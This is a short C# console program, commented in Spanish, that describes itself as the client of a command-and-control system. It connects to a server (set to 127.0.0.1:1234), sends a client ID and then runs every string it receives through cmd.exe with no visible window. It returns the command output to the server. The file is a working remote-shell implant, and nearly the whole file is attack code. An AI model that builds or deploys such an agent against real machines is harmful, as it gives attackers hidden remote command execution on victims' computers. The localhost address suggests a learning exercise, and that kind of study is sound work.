// Aplicacion de consola para el cliente del command and control
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;

Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

Console.WriteLine("Cliente conectandose al server...");


string ip = "127.0.0.1";
int port = 1234;
string idCliente = "abc";


IPAddress ipDst = IPAddress.Parse(ip);
IPEndPoint endpoind = new IPEndPoint(ipDst, port);

client.Connect(endpoind);

try
{
    client.Send(Encoding.UTF8.GetBytes("abc"));
    Console.WriteLine("Conectado al servidor. Esperando datos...");
    byte[] buffer = new byte[1024];
    while (true)
    {
        int bytesReceived = client.Receive(buffer);
        if (bytesReceived > 0)
        {
            string command = Encoding.UTF8.GetString(buffer, 0, bytesReceived);
            Console.WriteLine($"Comando a ejecutar: {command}");
            try
            {
                // Ejecutar el comando recibido
                var process = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/C {command}",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };

                process.Start();

                // Capturar la salida del comando
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                process.WaitForExit();

                // Enviar la salida de vuelta al servidor
                string response = string.IsNullOrEmpty(error) ? output : error;
                client.Send(Encoding.UTF8.GetBytes(response));
            }
            catch (Exception ex)
            {
                // Enviar el error al servidor
                client.Send(Encoding.UTF8.GetBytes($"Error ejecutando comando: {ex.Message}"));
            }
        }
    }
}
catch (Exception ex)
{
    Console.WriteLine($"Error: {ex.Message}");
}




client.Shutdown(SocketShutdown.Both);
client.Close();


